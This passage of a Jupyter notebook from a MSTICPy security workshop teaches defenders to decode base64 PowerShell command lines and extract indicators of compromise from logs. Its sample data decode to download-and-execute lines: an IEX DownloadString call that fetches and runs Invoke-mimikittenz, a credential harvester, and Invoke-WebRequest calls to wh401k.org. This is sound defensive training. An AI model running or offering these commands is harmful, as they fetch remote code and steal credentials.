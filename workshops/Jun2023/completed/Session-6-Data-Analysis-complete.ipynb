{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## MSTICPy and Notebooks in InfoSec\n",
    "\n",
    "---\n",
    "\n",
    "<h1 style=\"border: solid; padding:5pt; color:black; background-color:#909090\">Session 6 - Data analysis</h1>\n",
    "\n",
    "---\n",
    "\n",
    "## What this session covers:\n",
    "\n",
    "* Data Analysis capabilities in msticpy\n",
    "* Base 64 decoding\n",
    "* IoC Extraction\n",
    "* Outlier detection using Time Series Analysis\n",
    "\n",
    "\n",
    "## Prerequisites\n",
    "- Python >= 3.8 Environment\n",
    "- Jupyter installed\n",
    "- MSTICPy installed\n",
    "\n",
    "## Recommended\n",
    "- VS Code\n"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "\n",
    "# <a style=\"border: solid; padding:5pt; color:black; background-color:#909090\">Data Analysis capabilities in msticpy</a>\n",
    "\n",
    "---\n",
    "\n",
    "MSTICPy has several generic analysis and transformation functions. Some examples of transforms are:\n",
    "- Process tree building\n",
    "- decoding encoded and compressed data\n",
    "- IoC/observable extraction from data\n",
    "- Time series analysis\n",
    "- syslog parsing\n",
    "\n",
    "You can read more about the features in MSTICPy documentation.\n",
    " - [Data Analysis](https://msticpy.readthedocs.io/en/latest/DataAnalysis.html)\n",
    " - [Process Trees](https://msticpy.readthedocs.io/en/latest/visualization/ProcessTree.html)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-17T18:18:33.520024Z",
     "start_time": "2022-10-17T18:18:33.503259Z"
    }
   },
   "source": [
    "---\n",
    "\n",
    "# <a style=\"border: solid; padding:5pt; color:black; background-color:#909090\">Base 64 decoding using msticpy</a>\n",
    "\n",
    "---\n",
    "\n",
    "Often, Defenders have to bulk analyze the process execution commandline logs containing base64 encoded strings by decoding and analyzing them for malicious activity. \n",
    "This msticpy module allows you to extract base64 encoded content from a string or columns of Pandas DataFrame. \n",
    "\n",
    "Read more details - \n",
    "[Base64 Decoding and Unpacking](https://msticpy.readthedocs.io/en/latest/data_analysis/Base64Unpack.html)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:49:21.521976Z",
     "start_time": "2022-10-18T10:49:06.137141Z"
    }
   },
   "outputs": [],
   "source": [
    "# %env MSTICPYCONFIG=./msticpyconfig.yaml\n",
    "import msticpy as mp \n",
    "mp.init_notebook()\n",
    "pd.set_option('display.max_colwidth', 200)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In order to find module path, you can use search feature as shows below"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:49:23.600032Z",
     "start_time": "2022-10-18T10:49:23.584743Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <style>\n",
       "        .table_mod {border-collapse: collapse; width: 50%;}\n",
       "        .cell_mod {border: 1px solid #ddd !important;\n",
       "            text-align: left !important; padding: 15px !important;}\n",
       "    </style>\n",
       "    <h4>Modules matching 'base64'</h4>\n",
       "    <table class='table_mod'>\n",
       "    <tr class='cell_mod'><th>Module</th><th>Help</th></tr>\n",
       "    <tr class='cell_mod'><td>msticpy.transform.base64unpack</td><td><a href=https://msticpy.readthedocs.io/en/latest/api/msticpy.transform.base64unpack.html target='_blank'>msticpy.transform.base64unpack</a></td></tr>\n",
       "    </table>\n",
       "    "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "mp.search('base64')"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Once you identified the module path, you can use either on a input string or columns of Padas dataframe.\n",
    "\n",
    "Exmaple powershell command string with base64 encoded data. We can put this as input in next step.\n",
    "\n",
    "`powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vcHV0dGVycGFuZGEvbWltaWtpdHRlbnovbWFzdGVyL0ludm9rZS1taW1pa2l0dGVuei5wczEnKTsgSW52b2tlLW1pbWlraXR0ZW56Cg==`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:49:41.410325Z",
     "start_time": "2022-10-18T10:49:41.397106Z"
    }
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "60e35622a22641b8b3752ad76a6c10f1",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Text(value='', description='Enter a commandline with powershell base64 encoded', layout=Layout(width='50%'), s…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "cmdline = mp.nbwidgets.GetText(prompt='Enter a commandline with powershell base64 encoded', auto_display=True);"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "in order to decode, you can use `unpack` method within `base64unpack` tranform module/\n",
    "The library returns following information.\n",
    "- decoded string (if decodable to utf-8 or utf-16)\n",
    "- hashes of the decoded segment (MD5, SHA1, SHA256)\n",
    "- string of printable byte values (e.g. for submission to a disassembler)\n",
    "- the detected decoded file type (limited)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:49:52.856745Z",
     "start_time": "2022-10-18T10:49:52.841886Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"powershell -enc <decoded type='string' name='[None]' index='1' depth='1'>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1'); Invoke-mimikittenz\\n</decoded>\""
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Decode the string\n",
    "base64_dec_str = mp.transform.base64unpack.unpack(input_string=cmdline.value)\n",
    "\n",
    "# Print decoded string\n",
    "display(base64_dec_str[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:49:58.535524Z",
     "start_time": "2022-10-18T10:49:58.527773Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1'); Invoke-mimikittenz\\n\""
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Print decoded string\n",
    "display(base64_dec_str[1]['decoded_string'][0])"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## <a style=\"border: solid; padding:5pt; color:black; background-color:#309030\">Task 1 - Base 64 decoding using dataframe as input</a>\n",
    "\n",
    "Perform base 64 encoding on the data loaded from previous step.\n",
    "1. Choose the columns containing powershell base64 command line logs.\n",
    "2. Use python help (`process_enc_logs.mp.b64unpack` or `mp.transform.base64unpack.unpack_df`)\n",
    "   to find correct parameters such as input data and column name.\n",
    "3. Finally display the results\n",
    "\n",
    "<br>\n",
    "<details>\n",
    "<summary>Hints...</summary>\n",
    "<li>Use the cell below to identify the columns containing powershell base64 encoded logs.</li>\n",
    "<li>Use data and column to specify input dataframe and column containing powershell command line</li>\n",
    "<li>The final command to decode should look like one of the following.\n",
    "\n",
    "<pre>\n",
    "    # using the pandas msticpy accessor\n",
    "    process_enc_logs.mp.b64extract(column='CommandLine')\n",
    "</pre>\n",
    "\n",
    "<pre>\n",
    "    # using the standalone function\n",
    "    mp.transform.base64unpack.unpack_df(data=process_enc_logs, column='CommandLine')\n",
    "</pre>\n",
    "</li>\n",
    "<ul>\n",
    "</ul>\n",
    "</details>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:50:39.999012Z",
     "start_time": "2022-10-18T10:50:39.893771Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>TenantId</th>\n",
       "      <th>Account</th>\n",
       "      <th>EventID</th>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th>Computer</th>\n",
       "      <th>SubjectUserSid</th>\n",
       "      <th>SubjectUserName</th>\n",
       "      <th>SubjectDomainName</th>\n",
       "      <th>SubjectLogonId</th>\n",
       "      <th>NewProcessId</th>\n",
       "      <th>NewProcessName</th>\n",
       "      <th>TokenElevationType</th>\n",
       "      <th>ProcessId</th>\n",
       "      <th>CommandLine</th>\n",
       "      <th>ParentProcessName</th>\n",
       "      <th>TargetLogonId</th>\n",
       "      <th>SourceComputerId</th>\n",
       "      <th>TimeCreatedUtc</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>968</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>MSTICAlertsWin1\\MSTICAdmin</td>\n",
       "      <td>4688</td>\n",
       "      <td>2019-02-09 23:26:48.107</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>S-1-5-21-996632719-2361334927-4038480536-500</td>\n",
       "      <td>MSTICAdmin</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>0xab5a5ac</td>\n",
       "      <td>0x1260</td>\n",
       "      <td>C:\\W!ndows\\System32\\powershell.exe</td>\n",
       "      <td>%%1936</td>\n",
       "      <td>0x1684</td>\n",
       "      <td>.\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==</td>\n",
       "      <td>C:\\Windows\\System32\\cmd.exe</td>\n",
       "      <td>0x0</td>\n",
       "      <td>263a788b-6526-4cdc-8ed9-d79402fe4aa0</td>\n",
       "      <td>2019-02-09 23:26:48.107</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7452</th>\n",
       "      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n",
       "      <td>MSTICAlertsWin1\\MSTICAdmin</td>\n",
       "      <td>4688</td>\n",
       "      <td>2019-02-13 22:03:42.860</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>S-1-5-21-996632719-2361334927-4038480536-500</td>\n",
       "      <td>MSTICAdmin</td>\n",
       "      <td>MSTICAlertsWin1</td>\n",
       "      <td>0x1e821b5</td>\n",
       "      <td>0x61e0</td>\n",
       "      <td>C:\\W!ndows\\System32\\powershell.exe</td>\n",
       "      <td>%%1936</td>\n",
       "      <td>0x7b20</td>\n",
       "      <td>.\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==</td>\n",
       "      <td>C:\\Windows\\System32\\cmd.exe</td>\n",
       "      <td>0x0</td>\n",
       "      <td>263a788b-6526-4cdc-8ed9-d79402fe4aa0</td>\n",
       "      <td>2019-02-13 22:03:42.860</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                  TenantId                     Account  \\\n",
       "968   52b1ab41-869e-4138-9e40-2a4457f09bf0  MSTICAlertsWin1\\MSTICAdmin   \n",
       "7452  52b1ab41-869e-4138-9e40-2a4457f09bf0  MSTICAlertsWin1\\MSTICAdmin   \n",
       "\n",
       "      EventID           TimeGenerated         Computer  \\\n",
       "968      4688 2019-02-09 23:26:48.107  MSTICAlertsWin1   \n",
       "7452     4688 2019-02-13 22:03:42.860  MSTICAlertsWin1   \n",
       "\n",
       "                                    SubjectUserSid SubjectUserName  \\\n",
       "968   S-1-5-21-996632719-2361334927-4038480536-500      MSTICAdmin   \n",
       "7452  S-1-5-21-996632719-2361334927-4038480536-500      MSTICAdmin   \n",
       "\n",
       "     SubjectDomainName SubjectLogonId NewProcessId  \\\n",
       "968    MSTICAlertsWin1      0xab5a5ac       0x1260   \n",
       "7452   MSTICAlertsWin1      0x1e821b5       0x61e0   \n",
       "\n",
       "                          NewProcessName TokenElevationType ProcessId  \\\n",
       "968   C:\\W!ndows\\System32\\powershell.exe             %%1936    0x1684   \n",
       "7452  C:\\W!ndows\\System32\\powershell.exe             %%1936    0x7b20   \n",
       "\n",
       "                                                                                                                                                                          CommandLine  \\\n",
       "968   .\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==   \n",
       "7452  .\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==   \n",
       "\n",
       "                ParentProcessName TargetLogonId  \\\n",
       "968   C:\\Windows\\System32\\cmd.exe           0x0   \n",
       "7452  C:\\Windows\\System32\\cmd.exe           0x0   \n",
       "\n",
       "                          SourceComputerId          TimeCreatedUtc  \n",
       "968   263a788b-6526-4cdc-8ed9-d79402fe4aa0 2019-02-09 23:26:48.107  \n",
       "7452  263a788b-6526-4cdc-8ed9-d79402fe4aa0 2019-02-13 22:03:42.860  "
      ]
     },
     "execution_count": 9,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Load test data\n",
    "process_logs = pd.read_pickle('./data/processes_on_host.pkl')\n",
    "# Filter the records with powershell base 64 encoded data\n",
    "process_enc_logs = process_logs[process_logs['CommandLine'].str.contains(\"-enc\")]\n",
    "process_enc_logs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T09:15:27.727138Z",
     "start_time": "2022-10-18T09:15:27.699932Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>reference</th>\n",
       "      <th>original_string</th>\n",
       "      <th>file_name</th>\n",
       "      <th>file_type</th>\n",
       "      <th>input_bytes</th>\n",
       "      <th>decoded_string</th>\n",
       "      <th>encoding_type</th>\n",
       "      <th>file_hashes</th>\n",
       "      <th>md5</th>\n",
       "      <th>sha1</th>\n",
       "      <th>sha256</th>\n",
       "      <th>printable_bytes</th>\n",
       "      <th>src_index</th>\n",
       "      <th>CommandLine</th>\n",
       "      <th>full_decoded_string</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>(, 1., 1)</td>\n",
       "      <td>LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==</td>\n",
       "      <td>unknown</td>\n",
       "      <td>None</td>\n",
       "      <td>b'-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"'</td>\n",
       "      <td>-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"</td>\n",
       "      <td>utf-8</td>\n",
       "      <td>{'md5': '65716544c3db642171b7597cd3deca2b', 'sha1': '8aa4c81d51732addabcaa5d8f121c79b0923189f', 'sha256': '828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8'}</td>\n",
       "      <td>65716544c3db642171b7597cd3deca2b</td>\n",
       "      <td>8aa4c81d51732addabcaa5d8f121c79b0923189f</td>\n",
       "      <td>828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8</td>\n",
       "      <td>2d 4e 6f 6e 69 6e 74 65 72 61 63 74 69 76 65 20 2d 4e 6f 70 72 6f 66 69 6c 65 20 2d 43 6f 6d 6d 61 6e 64 20 22 49 6e 76 6f 6b 65 2d 45 78 70 72 65 73 73 69 6f 6e 20 47 65 74 2d 50 72 6f 63 65 73 7...</td>\n",
       "      <td>968</td>\n",
       "      <td>.\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==</td>\n",
       "      <td>.\\powershell  -enc &lt;decoded type='string' name='[None]' index='1' depth='1'&gt;-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"&lt;/dec...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>(, 1., 1)</td>\n",
       "      <td>LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==</td>\n",
       "      <td>unknown</td>\n",
       "      <td>None</td>\n",
       "      <td>b'-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"'</td>\n",
       "      <td>-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"</td>\n",
       "      <td>utf-8</td>\n",
       "      <td>{'md5': '65716544c3db642171b7597cd3deca2b', 'sha1': '8aa4c81d51732addabcaa5d8f121c79b0923189f', 'sha256': '828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8'}</td>\n",
       "      <td>65716544c3db642171b7597cd3deca2b</td>\n",
       "      <td>8aa4c81d51732addabcaa5d8f121c79b0923189f</td>\n",
       "      <td>828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8</td>\n",
       "      <td>2d 4e 6f 6e 69 6e 74 65 72 61 63 74 69 76 65 20 2d 4e 6f 70 72 6f 66 69 6c 65 20 2d 43 6f 6d 6d 61 6e 64 20 22 49 6e 76 6f 6b 65 2d 45 78 70 72 65 73 73 69 6f 6e 20 47 65 74 2d 50 72 6f 63 65 73 7...</td>\n",
       "      <td>7452</td>\n",
       "      <td>.\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==</td>\n",
       "      <td>.\\powershell  -enc &lt;decoded type='string' name='[None]' index='1' depth='1'&gt;-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"&lt;/dec...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   reference  \\\n",
       "0  (, 1., 1)   \n",
       "1  (, 1., 1)   \n",
       "\n",
       "                                                                                                                                                original_string  \\\n",
       "0  LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==   \n",
       "1  LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==   \n",
       "\n",
       "  file_name file_type  \\\n",
       "0   unknown      None   \n",
       "1   unknown      None   \n",
       "\n",
       "                                                                                                              input_bytes  \\\n",
       "0  b'-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"'   \n",
       "1  b'-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"'   \n",
       "\n",
       "                                                                                                        decoded_string  \\\n",
       "0  -Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"   \n",
       "1  -Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"   \n",
       "\n",
       "  encoding_type  \\\n",
       "0         utf-8   \n",
       "1         utf-8   \n",
       "\n",
       "                                                                                                                                                                     file_hashes  \\\n",
       "0  {'md5': '65716544c3db642171b7597cd3deca2b', 'sha1': '8aa4c81d51732addabcaa5d8f121c79b0923189f', 'sha256': '828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8'}   \n",
       "1  {'md5': '65716544c3db642171b7597cd3deca2b', 'sha1': '8aa4c81d51732addabcaa5d8f121c79b0923189f', 'sha256': '828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8'}   \n",
       "\n",
       "                                md5                                      sha1  \\\n",
       "0  65716544c3db642171b7597cd3deca2b  8aa4c81d51732addabcaa5d8f121c79b0923189f   \n",
       "1  65716544c3db642171b7597cd3deca2b  8aa4c81d51732addabcaa5d8f121c79b0923189f   \n",
       "\n",
       "                                                             sha256  \\\n",
       "0  828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8   \n",
       "1  828cce6aec56c6cc50b35041381f7d11a8d9c3cd0893625a45ed611875910fa8   \n",
       "\n",
       "                                                                                                                                                                                           printable_bytes  \\\n",
       "0  2d 4e 6f 6e 69 6e 74 65 72 61 63 74 69 76 65 20 2d 4e 6f 70 72 6f 66 69 6c 65 20 2d 43 6f 6d 6d 61 6e 64 20 22 49 6e 76 6f 6b 65 2d 45 78 70 72 65 73 73 69 6f 6e 20 47 65 74 2d 50 72 6f 63 65 73 7...   \n",
       "1  2d 4e 6f 6e 69 6e 74 65 72 61 63 74 69 76 65 20 2d 4e 6f 70 72 6f 66 69 6c 65 20 2d 43 6f 6d 6d 61 6e 64 20 22 49 6e 76 6f 6b 65 2d 45 78 70 72 65 73 73 69 6f 6e 20 47 65 74 2d 50 72 6f 63 65 73 7...   \n",
       "\n",
       "   src_index  \\\n",
       "0        968   \n",
       "1       7452   \n",
       "\n",
       "                                                                                                                                                                       CommandLine  \\\n",
       "0  .\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==   \n",
       "1  .\\powershell  -enc LU5vbmludGVyYWN0aXZlIC1Ob3Byb2ZpbGUgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uIEdldC1Qcm9jZXNzOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpIGh0dHA6Ly93aDQwMWsub3JnL2dldHBzIg==   \n",
       "\n",
       "                                                                                                                                                                                       full_decoded_string  \n",
       "0  .\\powershell  -enc <decoded type='string' name='[None]' index='1' depth='1'>-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"</dec...  \n",
       "1  .\\powershell  -enc <decoded type='string' name='[None]' index='1' depth='1'>-Noninteractive -Noprofile -Command \"Invoke-Expression Get-Process; Invoke-WebRequest -Uri http://wh401k.org/getps\"</dec...  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# specify the data and column parameters\n",
    "dec_df = mp.transform.base64unpack.unpack_df(data=process_enc_logs, column='CommandLine')\n",
    "\n",
    "# display dataframe\n",
    "display(dec_df)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-17T18:21:27.532198Z",
     "start_time": "2022-10-17T18:21:27.526776Z"
    }
   },
   "source": [
    "---\n",
    "\n",
    "# <a style=\"border: solid; padding:5pt; color:black; background-color:#909090\">IoC extraction using msticpy</a>\n",
    "\n",
    "---\n",
    "\n",
    "This module allows you to extract IoC patterns from a string or a DataFrame. This will be useful feature for defender for faster extraction and perform follow-up activities on those IoCs.\n",
    "\n",
    "For more detail - [IoC Extraction](https://msticpy.readthedocs.io/en/latest/data_analysis/IoCExtract.html)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You can use this module similar fashion either by providing input string or passing a dataframe with multiple logs containing IoCs.\n",
    "\n",
    "Enter sample command line in the next cell to see how it works. \n",
    "`netsh  start capture=yes IPv4.Address=1.2.3.4 tracefile=C:\\\\Users\\\\user\\\\AppData\\\\Local\\\\Temp\\\\bzzzzzz.txt`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:50:50.702927Z",
     "start_time": "2022-10-18T10:50:50.688563Z"
    }
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "9cf8f3816bfb43f1a0a04631cf1c5fa5",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Text(value='', description='Enter a commandline to extract IoCs', layout=Layout(width='50%'), style=TextStyle(…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# netsh  start capture=yes IPv4.Address=1.2.3.4 tracefile=C:\\\\Users\\\\user\\\\AppData\\\\Local\\\\Temp\\\\bzzzzzz.txt\n",
    "cmdline = mp.nbwidgets.GetText(prompt='Enter a commandline to extract IoCs', auto_display=True);"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You can use the `extract` method from `iocextract` class and provide input string."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:51:32.418188Z",
     "start_time": "2022-10-18T10:51:32.403798Z"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "    <style>\n",
       "        .table_mod {border-collapse: collapse; width: 50%;}\n",
       "        .cell_mod {border: 1px solid #ddd !important;\n",
       "            text-align: left !important; padding: 15px !important;}\n",
       "    </style>\n",
       "    <h4>Modules matching 'ioc'</h4>\n",
       "    <table class='table_mod'>\n",
       "    <tr class='cell_mod'><th>Module</th><th>Help</th></tr>\n",
       "    <tr class='cell_mod'><td>msticpy.transform.iocextract</td><td><a href=https://msticpy.readthedocs.io/en/latest/api/msticpy.transform.iocextract.html target='_blank'>msticpy.transform.iocextract</a></td></tr>\n",
       "    </table>\n",
       "    "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Find the module path\n",
    "mp.search('ioc')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2022-10-18T10:51:07.673646Z",
     "start_time": "2022-10-18T10:51:07.657997Z"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Potential IoCs found in alert process:\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "defaultdict(set,\n",
       "            {'ipv4': {'1.2.3.4'},\n",
       "             'windows_path': {'C:\\\\\\\\Users\\\\\\\\user\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\bzzzzzz.txt'}})"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "ioc_extractor = mp.transform.IoCExtract()\n",
    "\n",
